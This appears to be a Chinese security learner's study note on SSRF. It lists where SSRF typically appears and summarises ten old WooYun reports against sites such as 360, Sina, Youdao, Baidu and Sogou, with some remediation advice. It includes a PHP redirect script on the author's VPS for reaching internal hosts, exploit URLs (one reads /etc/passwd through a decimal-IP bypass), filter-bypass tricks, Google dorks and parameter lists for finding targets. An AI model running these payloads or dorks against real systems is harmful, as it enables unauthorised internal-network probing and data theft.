# 基础知识
个人认为，SSRF 主要要搞清楚两件事情：

 - 内网探测 
 - bypass

（后者可以参考 Orange 的 PPT。前者可以参考猪猪侠的 PPT。）

在去学习乌云那些前辈的SSRF经历之前，要学习一下**SSRF 可能出现的地方**。
（此处总结来自于 @z3r0yu 表哥的 [了解SSRF，这一篇就足够了](https://xz.aliyun.com/t/2115)。）

 1. 社交分享功能：获取超链接的标题等内容进行显示
 2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
 3. 在线翻译：给网址翻译对应网页的内容
 4. 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
 5. 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
 6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
 7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
 8. 数据库内置功能：数据库的比如mongodb的copyDatabase函数
 9. 邮件系统：比如接收邮件服务器地址
 10. 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
 11. 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞。<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
 13. 从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）


后面会从乌云的文章里面去匹配这些地方。这很重要，因为个人需要培养对于 SSRF 的嗅觉。
 
# 本文覆盖的乌云 SSRF 漏洞记录一览表
1. [利用两只鸡肋SSRF探测360内网](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-083592) - lijiejie 
2. [360某处ssrf突破可探测内网信息（附内网6379探测脚本）](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0229611) - Sunshie 【302 Bypass】
3. [新浪微博某处SSRF漏洞](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214334) - 猪猪侠 【常规思路】
4. [华为某分站存在SSRF漏洞](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214331) - 猪猪侠 【常规思路】
5. [斗鱼TV某处SSRF漏洞](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214325) - 猪猪侠
6. [有道翻译SSRF可通网易内网](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0212768) - 路人甲
7. [有道翻译SSRF修复不完整可绕过](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214261) - getshell1993 【xip.io Bypass】
8. [百度某处SSRF可漫游内网](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214138) - 浅蓝 【iframe Bypass】
9. [搜狗主站存在SSRF漏洞(绕过ip限制)](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0209788) - Vinc 【10 进制 Bypass】【敏感文件】
10. [我是如何漫游搜狗和搜狐内部网络的](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-026249) - 结界师



# 乌云漏洞详解
## 1. 利用两只鸡肋SSRF探测360内网
这里面提出了两个 SSRF，第二个太复杂先战略性放弃，只看第一个。

此 SSRF 位于：
``` shell
http://te.tuan.360.cn/checkapi_ajax.html?apiurl=http://soft.corp.qihoo.net
```
只能返回HTTP状态。可以检测指定的端口是否开放网络服务（如80,8360,8080，8000），以及相应的资源是否存在。

所以作者的利用思路是：

1. 探测网段开放8360端口的主机：使用此SSRF探测了 220.181.156.x 此C段开放 8360 端口的主机。过滤出响应码为200/302的即为端口开放。得到了开放了8360端口的主机之后，可以探测8360端口的网络服务。作者没有写怎么搞，但是既然此C段为公网段，那么nc HEAD即可获知服务。<br><br>
2. 探测内网资源：可能是通过lijiejie自己的subDomainBrute扫出来 soft.corp.qihoo.net 这个子域名的IP为10.108.79.189（内网IP）。然后通过此SSRF点去访问此主机，响应码200，说明可以利用此SSRF探测外网无法访问的资源。<br><br>
3. 扫内网段开放80端口的主机：扫 10.108.79.x 这个c段的80端口，继续检测内网中开放80端口的主机。得到了10.108.79.x段大量80提供web服务的主机。

**总结：**
属于情况 `11. 未公开的api实现以及其他扩展调用URL的功能`。

提炼出 Google Hacking 语法：
``` shell
inurl:?apiurl=
```

##2. 360某处ssrf突破可探测内网信息
此 SSRF 位于：
``` shell
http：//st.so.com
```

![title](https://leanote.com/api/file/getImage?fileId=5da2b2e0ab644167210001bd)

**漏洞证明：**

作者使用nc去探测此SSRF，先在ip为 phpinfo.me 的 vps 上nc监听360端口。然后在SSRF漏洞处访问此vps的360端口。vps的nc监听处收到一个来自 st.so.com 网站对应的IP 171.13.14.10的连接，说明是网站服务器发起的请求。SSRF漏洞存在！

**漏洞利用：**

因为这是一个识图的应用，输入图片 URL然后按下回车。接下来会发生什么？正确的解析URL的host，然后**进行过滤**。如何夹带进我们的探测内网payload?

为了绕开后端服务器的过滤以及HTTP的限制，这个时候可以使用跳转的方式来进行绕过。

常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。

在此使用了一个脚本去批量获取10.121.3.x网段的6379端口（redis服务）开放情况。

**脚本思路为**：

1.在自己的公网 vps(域名为phpinfo.me)上面放一个可访问的 exp.php。当然前提是要先在 vps 上面搭建起 web 服务。

2.exp.php 的内容如下：
``` php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```
可见这是会跳转到 `$scheme://$ip:$port/$data` 这个地址的。

3.当我们在识图网页的请求框输入了图片url，然后按下搜索。实际抓到的数据包为：
``` shell
post ....
"imgurl":payload
```
所以这里 payload 构造为：
``` shell
payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip={ip}%26port={port}%26data=hello.jpg"
```
这样就通过url参数的形式给 http://tv.phpinfo.me/exp.php 传入了值。
通过phpinfo.me的exp.php又进一步访问了传入的内网IP，及指定端口，注意这里是通过ftp协议去访问的。

即：通过302跳转绕过，访问了内网服务。exp.php放在外网服务器，通过exp.php中的302跳转跳到内网IP。

4.实际访问的内网网段为：10.121.3.x。

至于这个网段怎么来的，大神也不说，就随便猜测下：可能是通过子域名挖掘出一些内网IP（尤其是这种大公司）；可能是历史漏洞中泄露的网站内网拓扑；又或者，大神早就有这些资产了。

5.脚本中还有别的好玩的：

它利用了python的锁机制，先去访问每台 10.121.3.x 的 65321（这个IP怎么来的，就是个随便的，估计本来想打65432，但是端口最大65535），然后现在就有了一个进程。在此进程下再去try访问6379，如果端口开放，访问成功就会acquire一个lock，如果不开放就不会。然后如果lock.acquire()，就说明6379端口开放。

最终，获取了好几台开放了 redis 的内网主机。

**总结：**

在` 4. 图片加载/下载`处可能存在SSRF。可以通过填入远程 vps 的公网ip，看看是否收到连接的方式来证明此漏洞。

## 3. 新浪微博某处SSRF漏洞 
在2016年的时候，许多公司觉得SSRF不算漏洞。

**漏洞点：**

- 服务器：
http://service.weibo.com

- SSRF位置
http://service.weibo.com/share/share.php?appkey=872034675&content=utf-8&url=http://fuzz.wuyun.org/hello?world&title=wyssrf&pic=

- 参数
url

**漏洞证明:**

远程服务器获取到请求。

**利用思路：**
用此SSRF漏洞来打[新浪微博某系统存在远程命令执行漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0213360)这个漏洞。

**猪猪侠给出的修复建议：**

把用于取外网资源的API部署在不属于自己的机房。

**总结：**

这种情况属于 `7. 网站采集，网站抓取的地方`。在这个 SSRF 中，主要是新浪服务器去获取 url 对应的外网资源。

提炼出 Google Hacking 语法：
``` shell
inurl:?url=
```
## 4. 华为某分站存在SSRF漏洞

**漏洞点：**

- 网站
http://hnc.huawei.com/
- SSRF地址
http://hnc.huawei.com/web/downloadAction!download.do?relativePath=http://127.0.0.1:22&fileName=123.txt
- 参数
relativePath


**漏洞证明：**
1.访问 127.0.0.1:22，有直接回显。
http://hnc.huawei.com/web/downloadAction!download.do?relativePath=http://127.0.0.1:22&fileName=123.txt
回显：
SSH-2.0-WeOnlyDo 2.4.3

2.请求远程服务器，远程服务器收到连接。

在此要注意连接的IP是否来自网站服务器。

**总结：**
 这种情况属于 `4. 图片加载/下载`，虽然不是下载图片是下载文件，但是从外部IP获取资源下载的情况下可能存在 SSRF。


## 5. 斗鱼TV某处SSRF漏洞

**漏洞点：**

- 服务器
http://yuba.douyu.com
- SSRF地址
http://yuba.douyu.com/url/scrapy
- 参数, POST
url=http://www.baidu.com

![title](https://leanote.com/api/file/getImage?fileId=5da2c723ab64416721000224)

**漏洞证明：**
在 vps 上开启 nc 监听 8080 端口，收到来自斗鱼网站服务器的连接：
``` shell
nc -l -vv 8080
Connection from 119.90.48.56 port 8080 [tcp/webcache] accepted
GET /?123 HTTP/1.1
Host: 119.29.29.29:8080
Accept: */*
```

**总结：**
1. 这种情况属于`7. 网站采集，网站抓取的地方`。
2. 不要忽视 post 方式，只要有从外部url请求资源的点，都有可能存在 SSRF。

## 6. 有道翻译SSRF可通网易内网
**漏洞点：**

- 网址：
http://fanyi.youdao.com/WebpageTranslate?keyfrom=webfanyi.top&url=10.100.21.3&type=EN2ZH_CN

- 参数：url

![title](https://leanote.com/api/file/getImage?fileId=5da2d0feab6441691e00024f)

**漏洞利用：**

探测内网，主要是 10.100.21.x 网段的主机的web服务。

探测 10.100.21.22 发现开启了 Nginx 服务：
http://fanyi.youdao.com/WebpageTranslate?keyfrom=webfanyi.top&url=http%3A%2F%2F10.100.21.22&type=EN2ZH_CN

探测 10.100.21.7 发现是一个网站：网易汽车用户中心。
http://fanyi.youdao.com/WebpageTranslate?keyfrom=webfanyi.top&url=http%3A%2F%2F10.100.21.7&type=EN2ZH_CN

**总结：**

这里的场景就属于`3. 在线翻译：给网址翻译对应网页的内容`。

提炼出 Google Hacking 语法：
``` shell
site:fanyi.*.com
```

## 7. 有道翻译SSRF修复不完整可绕过

之前 getshell1993 提过一个有道翻译的 SSRF 漏洞：

漏洞点 url：
http://fanyi.youdao.com/WebpageTranslate?keyfrom=webfanyi.top&url=http%3A%2F%2F10.100.21.7&type=EN2ZH_CN

参数：url

厂商已做修复：

![title](https://leanote.com/api/file/getImage?fileId=5da2cad4ab64416721000245)


**漏洞绕过：**

1、通过xip.io

![title](https://leanote.com/api/file/getImage?fileId=5da2cb7fab64416721000247)

在这里比如：http://10.100.21.7.xip.io

所以还有 http://foo.bar.10.100.21.7.xip.io 等。


2、 通过xip.name



![title](https://leanote.com/api/file/getImage?fileId=5da2cbe4ab6441691e000214)

在这里比如:http://www.10.100.21.7.xip.name

再找别的类似功能的网站意义不大。甚至自己搭建此类功能的网站意义也不大。因为开发者要么不知道这种绕过方式、要么会直接先将 HOST 解析为具体 IP，这样的话什么网址都绕不过。


3、 短链接：

在这里使用了 T.IM 短网址/短链接生成器：
http://t.im/14tjq

**修复建议：**

查了下面对此类 bypass 的修复方法，面对此类 ssrf bypass，修复逻辑为：在检查Host的时候，我们需要将Host解析为具体IP，再进行判断。

代码中应该首先判断url是否是一个HTTP协议的URL（如果不检查，攻击者可能会利用file、gopher等协议进行攻击），然后获取url的host，并解析该host，最终将解析完成的IP放入is_inner_ipaddress函数中检查是否是内网IP。

**总结：**

这里的场景就属于`3. 在线翻译：给网址翻译对应网页的内容`。

## 8. 百度某处SSRF可漫游内网

有些时候不是没有 SSRF，是你测不出 SSRF 而已......

**漏洞点：**
漏洞在站长工具 - 移动专区 - 移动友好度
http://zhanzhang.baidu.com/mf/index?site=http://baidu.com
点击“一键检测”，就会在他们的移动终端浏览器访问且截图返回给你
在这里对网址做了一点限制：

![title](https://leanote.com/api/file/getImage?fileId=5da2e3deab644167210002e8)


**Bypass - 使用 iFrame 绕过：**

在攻击者自己的网站里放一个文件嵌入百度的内网地址 然后再检测此网站里的那个文件，就会通过 iframe 标签转到里面潜入的内网地址。

1、 访问内网地址：10.16.83.164 的 8080 端口
![title](https://leanote.com/api/file/getImage?fileId=5da2e464ab6441691e000281)

2、 访问百度内部网站 bbs
![title](https://leanote.com/api/file/getImage?fileId=5da2e522ab644167210002ea)

3、夹带敏感信息
![title](https://leanote.com/api/file/getImage?fileId=5da2e591ab644167210002ed)

4、DoS 攻击
在第三步中通过User-Agent得知是iOS8系统，通过2016年的那个可以让多数浏览器崩溃让iPhone注销的漏洞尝试检测，可能会导致终端注销，拒绝服务。试验成功：
![title](https://leanote.com/api/file/getImage?fileId=5da2e632ab6441691e000284)

**总结：**

属于情况 `2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览` 和`7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作`。

提炼出 Google Hacking 语法：

``` shell
inurl:?site=
```

## 9. 搜狗主站存在SSRF漏洞(绕过ip限制)

**漏洞点：**

- 漏洞点 url：

http://www.sogou.com/reventondc/transform?charset=GBK&key=%E8%B0%A2%E6%96%87%E4%B8%9C1&objid=2000000&type=2&userarea=sss&vrid=70043804&url=http://10.13.199.124.xip.io:8080/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd%23

- 参数：
url

上图中已经使用了 xip.io 来 bypass，不过 bypass 失败。

![title](https://leanote.com/api/file/getImage?fileId=5da2d45bab6441691e000255)

**漏洞绕过：**

1、IP 进制转换绕过内网IP检测

将IP转换为10进制绕过：


http://www.sogou.com/reventondc/transform?charset=GBK&key=%E8%B0%A2%E6%96%87%E4%B8%9C1&objid=2000000&type=2&userarea=sss&vrid=70043804&url=http://168675196:8080/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd%23

![title](https://leanote.com/api/file/getImage?fileId=5da2d66dab6441691e00025a)

`注意：`这里通过url参数的形式带出了 10.13.199.124 这台主机上的 /etc/passwd 。 


关于进制转换：有脚本、亮点自寻：

![title](https://leanote.com/api/file/getImage?fileId=5da344b4ab64416721000469)


当然其他进制也可以啊！

2、短域名绕过黑名单

当输入sogou-inc的时候也会检测：

http://www.sogou.com/reventondc/transform?charset=GBK&key=%E8%B0%A2%E6%96%87%E4%B8%9C1&objid=2000000&type=2&userarea=sss&vrid=70043804&url=http://www.sogou-inc.com

![title](https://leanote.com/api/file/getImage?fileId=5da2d5dfab6441672100029b)

不过通过生成短域名就能绕过。t.cn 短域名生成器生成的短域名：

![title](https://leanote.com/api/file/getImage?fileId=5da2d60fab6441691e000258)

## 10. 我是如何漫游搜狗和搜狐内部网络的

通过一些小的安全漏洞加上一些网络设计的不合理和安全边界的缺失是可以遍搜狗和搜狐内部网络的。

**漏洞点：**

sogou提供一个wap版本的网页转码服务，该服务会涉及到对网络的访问，也就可以访问内部网络了。

- 漏洞点url：

``` shell
http://wap.sogou.com/tc?url=http%3A%2F%2Fno.sohu.com%2F
```

- 参数：
url


**利用思路：**

结界师先给出了这样一个图：
![title](https://leanote.com/api/file/getImage?fileId=5da2dc58ab644167210002bc)

看样子似乎是在子域名爆破，目的也就是内网IP搜集。

插一句嘴，信息搜集老生常谈，但是据我观察，大佬的信息收集都很强。比如 Rices 大佬：

![title](https://leanote.com/api/file/getImage?fileId=5da2dcd1ab644167210002bf)

这里内网IP怎么搜集呢？大佬没说，我也没处问。自己的一些总结（感谢很多师傅的帮助！）：

1. 子域名挖掘，就找 lijiejie。里面会有一些内网IP（尤其是大公司）。当然小公司也有，就在两天前对某学校扫子域名就发现了内网 IP：
![title](https://leanote.com/api/file/getImage?fileId=5da2dd9eab6441691e00026c)
当然也不一定是lijiejie，也可以用比如 dirBrute 加上猪猪侠字典什么的。总之子域名挖掘就行了。
2. 寻找某个目标历史漏洞，里面有内网记录。比如本文提到的这么多文章里面至少说了搜狗、百度、360等公司的部分内网及内网段（多个b段、c段甚至开放的服务）。
3. 如果你有某个内网机器的cmdshell了，可以去ping其他内网机器，比如同C段的机器，根据结果获知主机是否存在。
4. 网页右键源代码，里面泄露的内网ip，开关人员信息，js加密的账号密码、接口......
5. 在Github上搜集此目标的内网IP。

后续利用就是各种内网IP **和内部网站的域名** 了。大牛能用 ssrf 探知出内网拓扑、探测内网服务、获取敏感数据、看到内部网站、直达第三方系统......

**总结：**

这种情况就是 `2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览`。

提炼出 Google Hacking 语法：

``` shell
site:wap.*.com
```

# 本文覆盖的参数字典
``` shell
apiurl
url
relativePath
site
fanyi （二级域名）
wap （二级域名）
```




----------------

## 参考链接：
1. [谈一谈如何在 Python 开发中拒绝 SSRF 漏洞](https://juejin.im/entry/57f0ff2a2e958a00555268b7)
